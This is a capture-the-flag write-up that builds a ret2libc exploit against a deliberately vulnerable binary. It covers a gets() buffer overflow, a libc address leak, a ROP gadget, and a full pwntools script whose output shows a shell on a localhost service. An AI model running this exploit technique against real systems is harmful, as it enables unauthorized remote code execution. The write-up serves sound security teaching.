# Hosting source-code is very hard

Once we visit the webiste on `localhost` running on port 80 we can see a messed up version of the source code for the
application. Apparently hosting source code is not as easy as they imagined. Instead of making sense of this mess we
are told to download the binary from `/magic_function_finder`.  
This enables us as attackers to test the binary locally, which is a huge advantage when trying to develop an exploit.
First we want to gather as much information as possible about this binary, we can use the linux utility `file` to 
know exactly what kind of executeable it is.

```
file magic_function_finder
magic_function_finder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e531535b3470d7de829961f443d09f6415788d2b, for GNU/Linux 3.2.0, not stripped
```

Next we are going to use `checksec` to find out with which security mechanisms the binary has been compilled


```
checksec magic_function_finder
[*] '/home/marius/Projects/ctf-challenges/ret2libc-master/challenge/magic_function_finder'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The binary appears to have been compiled with `--no-pie` and `--fno-stack-protector` options thus memory addresses 
in the context of the binary will never change (but addresses of libc functions such as `printf` are still going
to change) and there are no `stack canaries`  which means that we can overflow the stack without causing the programm
to immediately fail.

# The first Buffer Overflow

Once the binary is being executed, be it locally or remote, the user (or the attacker) is prompted to enter "Feedback".
By looking at the messy source code on the website we can see that the function `gets()` is being used - which tells us
that a Buffer Overflow is possible.
There is even a warning on the man page of gets (which you can look at by running `man gets`) that tells us not to
use gets.

```
Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue  to  store
characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
```

The `magic_function_finder` application also tells us the address of `printf_finder`, our goal is to modify the 
return pointer, by overriding it due to the bufferoverflow, so that we jump to and execute this `printf_finder` function.
To find out how many bytes we have to send before overwriting the return pointer we use `gdb` with the extension `gef`.

```
gef➤  pattern create128
[+] Generating a pattern of 128 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
[+] Saved as '$_gef0'
```

This pattern can be used as input to the `magic_function_finder` and should result in a segmentation fault. 
Start the application in gef with `run` and use the pattern as input. Once the porgram crashes use `info registers`
to let `gdb` show you the state of all registers. Then copy the value of the `rbp` register. Gef can tell us exactly
how many bytes of input we need to overwrite this register due to the previously created pattern.

```
gef➤  pattern search 0x6161616161616169
[+] Searching '0x6161616161616169'
[+] Found at offset 64 (little-endian search) likely
[+] Found at offset 57 (big-endian search)
```

We have to create an input of 64 bytes before we start to overwrite the `return pointer`.

# Start to develop the exploit

At this point we can start to develop the exploit, we will be using `python` and the `pwntools` librarry for that.
The first few things we have to do is to receive and save the address of `printf_finder` as well as creating a 64
byte long padding to use before overwriting the `return pointer`. 
Due to the source code on the website we can already anticipate the output of `magic_function_finder` once we execute
`printf_finder`.
The exploit is already able to jump to `printf_finder` and to receive the address of `printf` inside libc. 

```
from pwn import *
p = process("./magic_function_finder")

# Step 1, receive the address of find_printf
p.recvuntil("implemented at: ")
addr_of_find_printf = p.recvuntil("\n")
addr_of_find_printf = str(addr_of_find_printf).split("\\")[0]
addr_of_find_printf = str(addr_of_find_printf).split("'")[1]
print(f"found find_printf at: {addr_of_find_printf}")
p.recvuntil("feedback:")

# Step 2, Buffer Overflow -> calling printf_finder
addr_of_find_printf = int(addr_of_find_printf, 16)
padding = b"A" * 64
padding_rbp = b"B" * 4 + b"C" * 4
addr_of_find_printf = p64(addr_of_find_printf)
print(addr_of_find_printf)
payload = padding + padding_rbp + addr_of_find_printf
print(f"sending payload {payload}")
p.sendline(payload)
p.recvuntil("found printf, it's at:\n")
addr_of_printf = p.recvuntil("\n")
addr_of_printf = str(addr_of_printf).split("\\")[0]
addr_of_printf = str(addr_of_printf).split("'")[1]
print(f"found printf at: {addr_of_printf}")
```

Running this first part of the exploit confirms that we can indeed execute `printf_finder` and 
receive the address of `printf` inside `libc`.

```
[+] Starting local process './magic_function_finder': pid 16865
found find_printf at: 0x401219
b'\x19\x12@\x00\x00\x00\x00\x00'
sending payload b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x19\x12@\x00\x00\x00\x00\x00'
found printf at: 0x7f7563e17e10
[*] Stopped process './magic_function_finder' (pid 16865)
```

# Gathering more information

Next we want to use the address of `printf` inside `libc` to calculate the base address of `libc`. To do that
we need to know the offset between `printf` and the base address in the version of libc that is being used.
The author of `magic_function_finder` did not provide us with his libc version but we do know that the application
is running on ubuntu 20.04. We can create an ubuntu 20.04 Docker container and analyse the version of libc on there 
to find the offset between `printf` and the base address of `libc`. 
Let's create a `Dockerfile` as follows:

```
from ubuntu:20.04

RUN apt-get update
RUN apt-get install binutils -y
RUN apt-get install elfutils -y
```

Create a container from this `Dockerfile` with (note the `.`, you have to be in the same directory as the `Dockerfile`):

```
docker build -t ubuntu-test .
```

and start the container with 

```
docker run -dit --name ubuntu-test ubuntu-test
```
We can see that the container is up and ready by executing `docker ps`. 

```
CONTAINER ID   IMAGE         COMMAND   CREATED         STATUS        PORTS     NAMES
13f281175024   ubuntu-test   "bash"    2 seconds ago   Up 1 second             ubuntu-test
```

Now we can get a shell in this container by running:

```
docker exec -it ubuntu-test bash
```

On this shell inside the container we are now able to analyse `libc`. First we want to find `printf`, therefor we 
execute the following:

```
readlf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep printf
```

That generates a lot of output because the are many versions of `printf` inside `libc` but we can stil find the
plain and simple `printf` by skimming over it rather quickly.

```
637: 0000000000064e10   204 FUNC    GLOBAL DEFAULT   16 printf@@GLIBC_2.2.5
```

Now we know that the offset of `printf` inside `libc` is `0x64e10`.
With this information we can calculate the base address of `libc` in our exploit at runtime.
This also means that we can now find the offset of any other function inside `libc` and calculate
their address in our exploit by simpling adding their offset to the base address.
One function that is especially interessting for us is `system`. To find the offset of `system` in libc 
we can do the exact same thing we did for `printf`

```
readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep system
```

which returns us

```
1427: 0000000000055410    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
```

The Offset `0x55410` can be added to the base address of `libc` to calculate the address of `system` at runtime.
All that is left is a parameter to call `system()` with. Since our goal is to take control of the system the 
parameter should be a shell - `bash` or `sh`. Fortunately, the stirng "/bin/sh" is also part of `libc` and 
we can, again, find it's offset and calculate the real address at runtime. To find the address of "/bin/sh" we
can't use `readelf` anymore but instead we can use 'strings'

```
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
1b75aa /bin/sh
```

For the system to recognize this "/bin/sh" string as a parameter we need to set the `rdi` register to it.
We need a way to write the string "/bin/sh" into the `rdi` register. This would be done via the instruction `pop rdi`.
To achieve our goals we need to find a place in the code were `pop rdi` is executed and immediately followed by a return 
so that we can jump there, write "/bin/sh" into the `rdi` register and then execute return with our manipulated 
`return pointer` to execute `system`. In exploit development such useful instructions followed by a return are called
"Gadgets" and there are tools available to help us find gadgets that we can use. We are going to use `ROPGadget`.

```
ROPgadget --binary magic_function_finder | grep "pop rdi"
0x0000000000401403 : pop rdi ; ret
```

Now we have all the information we need to execute `system("/bin/sh")` on a second buffer overflow.

# Misfortunes never come singly

To use all the information we gathered a second buffer overflow is required. Luckily, when entering `printf_finder`
we are prompted for input which will again be read using `gets()`. For this second buffer overflow we can reuse the 
padding of the first payload because the the buffer is of the same size as the first one (known from the source-code 
visible on the webiste). After the padding we follow up with a ROP-Chain, first is the `pop rdi` gadget followed by
the address of "/bin/sh", this way the string "/bin/sh" is written into the `rdi` register. At the end of our payload 
is the address of `system`, we jump to this address once the return after `pop rdi` is triggered. 
We are now able to develop the entire exploit. We format all the new information properly and wait for the second time 
the server asks for our input, then we send our second payload consisting of padding and the full ROP-Chain.

# The Exploit

```
from pwn import *

p = remote("localhost", 1024)

# Step 1, receive the address of find_printf
p.recvuntil("implemented at: ")
addr_of_find_printf = p.recvuntil("\n")
addr_of_find_printf = str(addr_of_find_printf).split("\\")[0]
addr_of_find_printf = str(addr_of_find_printf).split("'")[1]
print(f"found find_printf at: {addr_of_find_printf}")
p.recvuntil("feedback:")

# Step 2, Buffer Overflow -> calling printf_finder
addr_of_find_printf = int(addr_of_find_printf, 16)
padding = b"A" * 64
padding_rbp = b"B" * 4 + b"C" * 4
addr_of_find_printf = p64(addr_of_find_printf)
print(addr_of_find_printf)
payload = padding + padding_rbp + addr_of_find_printf
print(f"sending payload {payload}")
p.sendline(payload)
p.recvuntil("found printf, it's at:\n")
addr_of_printf = p.recvuntil("\n")
addr_of_printf = str(addr_of_printf).split("\\")[0]
addr_of_printf = str(addr_of_printf).split("'")[1]
print(f"found printf at: {addr_of_printf}")

# Step3, calculate the base of libc -> calculate the address of system
printf_offset  = "0x64e10"  # still a local value for testing
system_offset  = "0x55410"  # still a local value for testing
bin_sh_in_libc_offset = "0x1b75aa" # still a local value for testing
# pop_rdi = "0x4013d3"

pop_rdi = "0x401403"
libc_base = int(addr_of_printf, 16) - int(printf_offset, 16)

libc_system =int(hex(libc_base), 16) + int(system_offset, 16)

binsh_libc = int(hex(libc_base), 16) + int(bin_sh_in_libc_offset, 16)

print(f"found libc_base: {hex(libc_base)}")
print(f"found system in libc: {hex(libc_system)}")
print(p.recvuntil("Wait, how did you get here?\n"))

pop_rdi = p64(int(pop_rdi, 16))
binsh_libc = p64(binsh_libc)
libc_system = p64(libc_system)

rop_chain = pop_rdi + binsh_libc + libc_system
payload2 = padding + padding_rbp + rop_chain
# payload2 = padding + padding_rbp + p64(libc_system)
print(f"sending second payload {payload2}")
p.sendline(payload2)

p.interactive()
p.close()
```

Which we can run to give us a shell on the "remote" system

```
$ python3 exploit.py
[+] Opening connection to localhost on port 1024: Done
found find_printf at: 0x401219
b'\x19\x12@\x00\x00\x00\x00\x00'
sending payload b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x19\x12@\x00\x00\x00\x00\x00'
found printf at: 0x7fe70dbbce10
found libc_base: 0x7fe70db58000
found system in libc: 0x7fe70dbad410
b'Wait, how did you get here?\n'
sending second payload b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x03\x14@\x00\x00\x00\x00\x00\xaa\xf5\xd0\r\xe7\x7f\x00\x00\x10\xd4\xba\r\xe7\x7f\x00\x00'
[*] Switching to interactive mode
$ ls
flag
magic_function_finder
start.sh
ynetd
$ whoami
ctf
$
```

# Ressources and Tools

gef: https://github.com/hugsy/gef  
ROPGadet: https://github.com/JonathanSalwan/ROPgadget  
Pwntools: https://github.com/Gallopsled/pwntools  
